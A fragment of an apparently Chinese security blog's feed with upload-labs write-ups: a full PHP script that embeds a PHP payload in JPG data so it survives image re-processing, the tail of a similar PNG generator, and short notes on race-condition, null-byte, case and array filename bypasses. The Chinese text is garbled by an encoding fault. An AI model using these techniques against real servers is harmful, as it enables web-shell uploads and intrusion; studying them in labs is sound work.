class=\"hljs-number\">0x67</span>, <span class=\"hljs-number\">0xa5</span>, <span class=\"hljs-number\">0xbe</span>, <span class=\"hljs-number\">0x5f</span>, <span class=\"hljs-number\">0x76</span>, <span class=\"hljs-number\">0x74</span>, <span class=\"hljs-number\">0x5a</span>, <span class=\"hljs-number\">0x4c</span>,<br>           <span class=\"hljs-number\">0xa1</span>, <span class=\"hljs-number\">0x3f</span>, <span class=\"hljs-number\">0x7a</span>, <span class=\"hljs-number\">0xbf</span>, <span class=\"hljs-number\">0x30</span>, <span class=\"hljs-number\">0x6b</span>, <span class=\"hljs-number\">0x88</span>, <span class=\"hljs-number\">0x2d</span>,<br>           <span class=\"hljs-number\">0x60</span>, <span class=\"hljs-number\">0x65</span>, <span class=\"hljs-number\">0x7d</span>, <span class=\"hljs-number\">0x52</span>, <span class=\"hljs-number\">0x9d</span>, <span class=\"hljs-number\">0xad</span>, <span class=\"hljs-number\">0x88</span>, <span class=\"hljs-number\">0xa1</span>,<br>           <span class=\"hljs-number\">0x66</span>, <span class=\"hljs-number\">0x44</span>, <span class=\"hljs-number\">0x50</span>, <span class=\"hljs-number\">0x33</span>);<br><br><br><br><span class=\"hljs-variable\">$img</span> = imagecreatetruecolor(<span class=\"hljs-number\">32</span>, <span class=\"hljs-number\">32</span>);<br><br><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-variable\">$y</span> = <span class=\"hljs-number\">0</span>; <span class=\"hljs-variable\">$y</span> &lt; sizeof(<span class=\"hljs-variable\">$p</span>); <span class=\"hljs-variable\">$y</span> += <span class=\"hljs-number\">3</span>) &#123;<br>   <span class=\"hljs-variable\">$r</span> = <span class=\"hljs-variable\">$p</span>[<span class=\"hljs-variable\">$y</span>];<br>   <span class=\"hljs-variable\">$g</span> = <span class=\"hljs-variable\">$p</span>[<span class=\"hljs-variable\">$y</span>+<span class=\"hljs-number\">1</span>];<br>   <span class=\"hljs-variable\">$b</span> = <span class=\"hljs-variable\">$p</span>[<span class=\"hljs-variable\">$y</span>+<span class=\"hljs-number\">2</span>];<br>   <span class=\"hljs-variable\">$color</span> = imagecolorallocate(<span class=\"hljs-variable\">$img</span>, <span class=\"hljs-variable\">$r</span>, <span class=\"hljs-variable\">$g</span>, <span class=\"hljs-variable\">$b</span>);<br>   imagesetpixel(<span class=\"hljs-variable\">$img</span>, round(<span class=\"hljs-variable\">$y</span> / <span class=\"hljs-number\">3</span>), <span class=\"hljs-number\">0</span>, <span class=\"hljs-variable\">$color</span>);<br>&#125;<br><br>imagepng(<span class=\"hljs-variable\">$img</span>,<span class=\"hljs-string\">&#x27;./1.png&#x27;</span>);<br><span class=\"hljs-meta\">?&gt;</span><br>â€‹```<br></code></pre></td></tr></table></figure>\n\n<p>JPG:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br>    <span class=\"hljs-comment\">/*</span><br><span class=\"hljs-comment\"></span><br><span class=\"hljs-comment\">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class=\"hljs-comment\">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class=\"hljs-comment\"></span><br><span class=\"hljs-comment\">    1) Upload an arbitrary image via secured files upload script</span><br><span class=\"hljs-comment\">    2) Save the processed image and launch:</span><br><span class=\"hljs-comment\">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class=\"hljs-comment\"></span><br><span class=\"hljs-comment\">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class=\"hljs-comment\"></span><br><span class=\"hljs-comment\">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class=\"hljs-comment\">    1) After the second processing the injected data may become partially corrupted.</span><br><span class=\"hljs-comment\">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><br><span class=\"hljs-comment\">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class=\"hljs-comment\"></span><br><span class=\"hljs-comment\">    Sergey Bobrov <span class=\"hljs-doctag\">@Black</span>2Fan.</span><br><span class=\"hljs-comment\"></span><br><span class=\"hljs-comment\">    See also:</span><br><span class=\"hljs-comment\">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class=\"hljs-comment\"></span><br><span class=\"hljs-comment\">    */</span><br><br>    <span class=\"hljs-variable\">$miniPayload</span> = <span class=\"hljs-string\">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;<br><br><br>    <span class=\"hljs-keyword\">if</span>(!extension_loaded(<span class=\"hljs-string\">&#x27;gd&#x27;</span>) || !function_exists(<span class=\"hljs-string\">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;<br>        <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;php-gd is not installed&#x27;</span>);<br>    &#125;<br><br>    <span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$argv</span>[<span class=\"hljs-number\">1</span>])) &#123;<br>        <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);<br>    &#125;<br><br>    set_error_handler(<span class=\"hljs-string\">&quot;custom_error_handler&quot;</span>);<br><br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-variable\">$pad</span> = <span class=\"hljs-number\">0</span>; <span class=\"hljs-variable\">$pad</span> &lt; <span class=\"hljs-number\">1024</span>; <span class=\"hljs-variable\">$pad</span>++) &#123;<br>        <span class=\"hljs-variable\">$nullbytePayloadSize</span> = <span class=\"hljs-variable\">$pad</span>;<br>        <span class=\"hljs-variable\">$dis</span> = <span class=\"hljs-keyword\">new</span> DataInputStream(<span class=\"hljs-variable\">$argv</span>[<span class=\"hljs-number\">1</span>]);<br>        <span class=\"hljs-variable\">$outStream</span> = file_get_contents(<span class=\"hljs-variable\">$argv</span>[<span class=\"hljs-number\">1</span>]);<br>        <span class=\"hljs-variable\">$extraBytes</span> = <span class=\"hljs-number\">0</span>;<br>        <span class=\"hljs-variable\">$correctImage</span> = <span class=\"hljs-literal\">TRUE</span>;<br><br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$dis</span>-&gt;readShort() != <span class=\"hljs-number\">0xFFD8</span>) &#123;<br>            <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;Incorrect SOI marker&#x27;</span>);<br>        &#125;<br><br>        <span class=\"hljs-keyword\">while</span>((!<span class=\"hljs-variable\">$dis</span>-&gt;eof()) &amp;&amp; (<span class=\"hljs-variable\">$dis</span>-&gt;readByte() == <span class=\"hljs-number\">0xFF</span>)) &#123;<br>            <span class=\"hljs-variable\">$marker</span> = <span class=\"hljs-variable\">$dis</span>-&gt;readByte();<br>            <span class=\"hljs-variable\">$size</span> = <span class=\"hljs-variable\">$dis</span>-&gt;readShort() - <span class=\"hljs-number\">2</span>;<br>            <span class=\"hljs-variable\">$dis</span>-&gt;skip(<span class=\"hljs-variable\">$size</span>);<br>            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$marker</span> === <span class=\"hljs-number\">0xDA</span>) &#123;<br>                <span class=\"hljs-variable\">$startPos</span> = <span class=\"hljs-variable\">$dis</span>-&gt;seek();<br>                <span class=\"hljs-variable\">$outStreamTmp</span> = <br>                    substr(<span class=\"hljs-variable\">$outStream</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-variable\">$startPos</span>) . <br>                    <span class=\"hljs-variable\">$miniPayload</span> . <br>                    str_repeat(<span class=\"hljs-string\">&quot;\\0&quot;</span>,<span class=\"hljs-variable\">$nullbytePayloadSize</span>) . <br>                    substr(<span class=\"hljs-variable\">$outStream</span>, <span class=\"hljs-variable\">$startPos</span>);<br>                checkImage(<span class=\"hljs-string\">&#x27;_&#x27;</span>.<span class=\"hljs-variable\">$argv</span>[<span class=\"hljs-number\">1</span>], <span class=\"hljs-variable\">$outStreamTmp</span>, <span class=\"hljs-literal\">TRUE</span>);<br>                <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$extraBytes</span> !== <span class=\"hljs-number\">0</span>) &#123;<br>                    <span class=\"hljs-keyword\">while</span>((!<span class=\"hljs-variable\">$dis</span>-&gt;eof())) &#123;<br>                        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$dis</span>-&gt;readByte() === <span class=\"hljs-number\">0xFF</span>) &#123;<br>                            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$dis</span>-&gt;readByte !== <span class=\"hljs-number\">0x00</span>) &#123;<br>                                <span class=\"hljs-keyword\">break</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                    <span class=\"hljs-variable\">$stopPos</span> = <span class=\"hljs-variable\">$dis</span>-&gt;seek() - <span class=\"hljs-number\">2</span>;<br>                    <span class=\"hljs-variable\">$imageStreamSize</span> = <span class=\"hljs-variable\">$stopPos</span> - <span class=\"hljs-variable\">$startPos</span>;<br>                    <span class=\"hljs-variable\">$outStream</span> = <br>                        substr(<span class=\"hljs-variable\">$outStream</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-variable\">$startPos</span>) . <br>                        <span class=\"hljs-variable\">$miniPayload</span> . <br>                        substr(<br>                            str_repeat(<span class=\"hljs-string\">&quot;\\0&quot;</span>,<span class=\"hljs-variable\">$nullbytePayloadSize</span>).<br>                                substr(<span class=\"hljs-variable\">$outStream</span>, <span class=\"hljs-variable\">$startPos</span>, <span class=\"hljs-variable\">$imageStreamSize</span>),<br>                            <span class=\"hljs-number\">0</span>,<br>                            <span class=\"hljs-variable\">$nullbytePayloadSize</span>+<span class=\"hljs-variable\">$imageStreamSize</span>-<span class=\"hljs-variable\">$extraBytes</span>) . <br>                                substr(<span class=\"hljs-variable\">$outStream</span>, <span class=\"hljs-variable\">$stopPos</span>);<br>                &#125; <span class=\"hljs-keyword\">elseif</span>(<span class=\"hljs-variable\">$correctImage</span>) &#123;<br>                    <span class=\"hljs-variable\">$outStream</span> = <span class=\"hljs-variable\">$outStreamTmp</span>;<br>                &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>                    <span class=\"hljs-keyword\">break</span>;<br>                &#125;<br>                <span class=\"hljs-keyword\">if</span>(checkImage(<span class=\"hljs-string\">&#x27;payload_&#x27;</span>.<span class=\"hljs-variable\">$argv</span>[<span class=\"hljs-number\">1</span>], <span class=\"hljs-variable\">$outStream</span>)) &#123;<br>                    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;Success!&#x27;</span>);<br>                &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>                    <span class=\"hljs-keyword\">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    unlink(<span class=\"hljs-string\">&#x27;payload_&#x27;</span>.<span class=\"hljs-variable\">$argv</span>[<span class=\"hljs-number\">1</span>]);<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;Something\\&#x27;s wrong&#x27;</span>);<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">checkImage</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$filename</span>, <span class=\"hljs-variable\">$data</span>, <span class=\"hljs-variable\">$unlink</span> = <span class=\"hljs-literal\">FALSE</span></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">global</span> <span class=\"hljs-variable\">$correctImage</span>;<br>        file_put_contents(<span class=\"hljs-variable\">$filename</span>, <span class=\"hljs-variable\">$data</span>);<br>        <span class=\"hljs-variable\">$correctImage</span> = <span class=\"hljs-literal\">TRUE</span>;<br>        imagecreatefromjpeg(<span class=\"hljs-variable\">$filename</span>);<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$unlink</span>)<br>            unlink(<span class=\"hljs-variable\">$filename</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$correctImage</span>;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">custom_error_handler</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$errno</span>, <span class=\"hljs-variable\">$errstr</span>, <span class=\"hljs-variable\">$errfile</span>, <span class=\"hljs-variable\">$errline</span></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">global</span> <span class=\"hljs-variable\">$extraBytes</span>, <span class=\"hljs-variable\">$correctImage</span>;<br>        <span class=\"hljs-variable\">$correctImage</span> = <span class=\"hljs-literal\">FALSE</span>;<br>        <span class=\"hljs-keyword\">if</span>(preg_match(<span class=\"hljs-string\">&#x27;/(\\d+) extraneous bytes before marker/&#x27;</span>, <span class=\"hljs-variable\">$errstr</span>, <span class=\"hljs-variable\">$m</span>)) &#123;<br>            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$m</span>[<span class=\"hljs-number\">1</span>])) &#123;<br>                <span class=\"hljs-variable\">$extraBytes</span> = (<span class=\"hljs-keyword\">int</span>)<span class=\"hljs-variable\">$m</span>[<span class=\"hljs-number\">1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">DataInputStream</span> </span>&#123;<br>        <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$binData</span>;<br>        <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$order</span>;<br>        <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$size</span>;<br><br>        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$filename</span>, <span class=\"hljs-variable\">$order</span> = <span class=\"hljs-literal\">false</span>, <span class=\"hljs-variable\">$fromString</span> = <span class=\"hljs-literal\">false</span></span>) </span>&#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;binData = <span class=\"hljs-string\">&#x27;&#x27;</span>;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;order = <span class=\"hljs-variable\">$order</span>;<br>            <span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-variable\">$fromString</span>) &#123;<br>                <span class=\"hljs-keyword\">if</span>(!file_exists(<span class=\"hljs-variable\">$filename</span>) || !is_file(<span class=\"hljs-variable\">$filename</span>))<br>                    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;File not exists [&#x27;</span>.<span class=\"hljs-variable\">$filename</span>.<span class=\"hljs-string\">&#x27;]&#x27;</span>);<br>                <span class=\"hljs-keyword\">$this</span>-&gt;binData = file_get_contents(<span class=\"hljs-variable\">$filename</span>);<br>            &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>                <span class=\"hljs-keyword\">$this</span>-&gt;binData = <span class=\"hljs-variable\">$filename</span>;<br>            &#125;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;size = strlen(<span class=\"hljs-keyword\">$this</span>-&gt;binData);<br>        &#125;<br><br>        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">seek</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>            <span class=\"hljs-keyword\">return</span> (<span class=\"hljs-keyword\">$this</span>-&gt;size - strlen(<span class=\"hljs-keyword\">$this</span>-&gt;binData));<br>        &#125;<br><br>        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">skip</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$skip</span></span>) </span>&#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;binData = substr(<span class=\"hljs-keyword\">$this</span>-&gt;binData, <span class=\"hljs-variable\">$skip</span>);<br>        &#125;<br><br>        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">readByte</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;eof()) &#123;<br>                <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class=\"hljs-variable\">$byte</span> = substr(<span class=\"hljs-keyword\">$this</span>-&gt;binData, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">1</span>);<br>            <span class=\"hljs-keyword\">$this</span>-&gt;binData = substr(<span class=\"hljs-keyword\">$this</span>-&gt;binData, <span class=\"hljs-number\">1</span>);<br>            <span class=\"hljs-keyword\">return</span> ord(<span class=\"hljs-variable\">$byte</span>);<br>        &#125;<br><br>        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">readShort</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>            <span class=\"hljs-keyword\">if</span>(strlen(<span class=\"hljs-keyword\">$this</span>-&gt;binData) &lt; <span class=\"hljs-number\">2</span>) &#123;<br>                <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class=\"hljs-variable\">$short</span> = substr(<span class=\"hljs-keyword\">$this</span>-&gt;binData, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">2</span>);<br>            <span class=\"hljs-keyword\">$this</span>-&gt;binData = substr(<span class=\"hljs-keyword\">$this</span>-&gt;binData, <span class=\"hljs-number\">2</span>);<br>            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;order) &#123;<br>                <span class=\"hljs-variable\">$short</span> = (ord(<span class=\"hljs-variable\">$short</span>[<span class=\"hljs-number\">1</span>]) &lt;&lt; <span class=\"hljs-number\">8</span>) + ord(<span class=\"hljs-variable\">$short</span>[<span class=\"hljs-number\">0</span>]);<br>            &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>                <span class=\"hljs-variable\">$short</span> = (ord(<span class=\"hljs-variable\">$short</span>[<span class=\"hljs-number\">0</span>]) &lt;&lt; <span class=\"hljs-number\">8</span>) + ord(<span class=\"hljs-variable\">$short</span>[<span class=\"hljs-number\">1</span>]);<br>            &#125;<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$short</span>;<br>        &#125;<br><br>        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eof</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>            <span class=\"hljs-keyword\">return</span> !<span class=\"hljs-keyword\">$this</span>-&gt;binData||(strlen(<span class=\"hljs-keyword\">$this</span>-&gt;binData) === <span class=\"hljs-number\">0</span>);<br>        &#125;<br>    &#125;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h1 id=\"Less-17\"><a href=\"#Less-17\" class=\"headerlink\" title=\"Less-17\"></a>Less-17</h1><p>è¿™ä¸€å…³è€ƒå¯Ÿæ¡ä»¶ç«äº‰ï¼Œçœ‹æºç å‘ç°æ˜¯å…ˆä¿å­˜ç„¶åå†åˆ¤æ–­æ˜¯å¦éœ€è¦åˆ é™¤ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥ä¸€è¾¹ä¸æ–­å‘åŒ…ä¸Šä¼ ï¼Œä¸€è¾¹ä¸æ–­è¯·æ±‚æ‰§è¡Œã€‚ä¸Šä¼ ä¸€ä¸ªæ‰§è¡Œå°±ä¼šé¢å¤–ç”Ÿæˆæœ¨é©¬çš„æœ¨é©¬ï¼ŒæŠ“ä½åˆ¤æ–­æ˜¯å¦éœ€è¦åˆ é™¤çš„ä¸€å°æ®µæ—¶é—´æ¥å‘èµ·è¯·æ±‚ï¼Œè¾¾åˆ°ç›®çš„ã€‚æˆ‘è·‘äº†ä¸€ä¸‡æ¬¡æ‰æœ‰ä¸€æ¬¡è®¿é—®æˆåŠŸï¼Œè¿˜æ˜¯è¦é è¿æ°”ã€‚ã€‚ã€‚ã€‚</p>\n<h1 id=\"Less-18\"><a href=\"#Less-18\" class=\"headerlink\" title=\"Less-18\"></a>Less-18</h1><p>åŒæ ·ä¹Ÿæ˜¯æ¡ä»¶ç«äº‰</p>\n<h1 id=\"Less-19\"><a href=\"#Less-19\" class=\"headerlink\" title=\"Less-19\"></a>Less-19</h1><p>WPè¯´æ˜¯å¯ä»¥%00æˆªæ–­1.php%00.jpgæˆ–è€…ä¿å­˜åä¸º1.php/.    ä½†æ˜¯æˆ‘å‘ç°å¥½åƒå¯ä»¥å¤§å°å†™ç»•è¿‡ï¼Ÿè¯•äº†ä¸€ä¸‹æˆåŠŸäº†å˜»å˜»å˜»</p>\n<h1 id=\"Less-20\"><a href=\"#Less-20\" class=\"headerlink\" title=\"Less-20\"></a>Less-20</h1><p>å®¡è®¡ä»£ç ï¼Œ1.æ£€æŸ¥MIMEç±»å‹ 2. æ£€æŸ¥æ–‡ä»¶åï¼Œå¦‚æœæ˜¯å­—ç¬¦ä¸²ï¼Œå°±ç›´æ¥é€šè¿‡.æ‰“æ•£ç„¶åå–å‡ºåç¼€ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ä¸Šä¼ æ•°ç»„ç»•è¿‡å¤„ç†ï¼Œç„¶åä¸Šä¼ ä¸€ä¸ªæ•°é‡ä¸ºä¸‰çš„æ•°ç»„ï¼Œæœ€åä¸€ä¸ªå…ƒç´ æ”¾jpgï¼Œç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯1.phpï¼Œä¸­é—´çš„å…ƒç´ ä¸ºç©ºï¼Œè¿™æ ·ç»•è¿‡åˆ¤æ–­æœ€åä¸€ä¸ªå…ƒç´ æ˜¯ä¸æ˜¯jpgï¼ŒåŒæ—¶æ‹¼æ¥å‡ºæ¥çš„æ–‡ä»¶åæ˜¯<code>1.php.</code>ï¼Œè¾¾åˆ°æ•ˆæœã€‚</p>\n",
            "tags": []
        },
        {
            "id": "http://blog.m1n.me/2019/09/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/",
            "url": "http://blog.m1n.me/2019/09/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/",
            "title": "æ–‡ä»¶ä¸Šä¼ æ¼æ´",
            "date_published": "2019-09-10T09:01:12.000Z",
            "content_html": "<h2 id=\"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç®€ä»‹\"><a href=\"#æ–‡ä»¶ä¸Šä¼ æ¼æ´ç®€ä»‹\" class=\"headerlink\" title=\"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç®€ä»‹\"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´ç®€ä»‹</h2><p>æ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯webå®‰å…¨ä¸­ç»å¸¸é‡åˆ°çš„ä¸€ç§æ¼æ´å½¢å¼ï¼Œæ–‡ä»¶ä¸Šä¼ æ¼æ´å°±æ˜¯åˆ©ç”¨å¯ä»¥ä¸Šä¼ æ–‡ä»¶çš„åœ°æ–¹å°†æ¶æ„ä»£ç æˆ–æ–‡ä»¶æ¤å…¥åˆ°æœåŠ¡å™¨ä¸­ï¼Œå†é€šè¿‡URLå»è®¿é—®æ¥æ‰§è¡Œä»£ç ï¼Œä½†æ˜¯ç»å¸¸ä¼šé‡åˆ°å„ç§é™åˆ¶å’Œè¿‡æ»¤ï¼Œå› æ­¤å°±è¦å­¦ä¼šå„ç§å§¿åŠ¿æ¥ç»•è¿‡ã€‚</p>\n<span id=\"more\"></span>\n<h2 id=\"å¸¸è§çš„é™åˆ¶ä»¥åŠç»•è¿‡\"><a href=\"#å¸¸è§çš„é™åˆ¶ä»¥åŠç»•è¿‡\" class=\"headerlink\" title=\"å¸¸è§çš„é™åˆ¶ä»¥åŠç»•è¿‡\"></a>å¸¸è§çš„é™åˆ¶ä»¥åŠç»•è¿‡</h2><h3 id=\"å®¢æˆ·ç«¯éªŒè¯ï¼ˆå‰ç«¯éªŒè¯\"><a href=\"#å®¢æˆ·ç«¯éªŒè¯ï¼ˆå‰ç«¯éªŒè¯\" class=\"headerlink\" title=\"å®¢æˆ·ç«¯éªŒè¯ï¼ˆå‰ç«¯éªŒè¯)\"></a>å®¢æˆ·ç«¯éªŒè¯ï¼ˆå‰ç«¯éªŒè¯)</h3><h4 id=\"åŸç†\"><a href=\"#åŸç†\" class=\"headerlink\" title=\"åŸç†\"></a>åŸç†</h4><p>å°±æ˜¯é€šè¿‡å‰ç«¯ä»£ç æ¥æ£€æŸ¥ç”¨æˆ·æ‰€ä¸Šä¼ 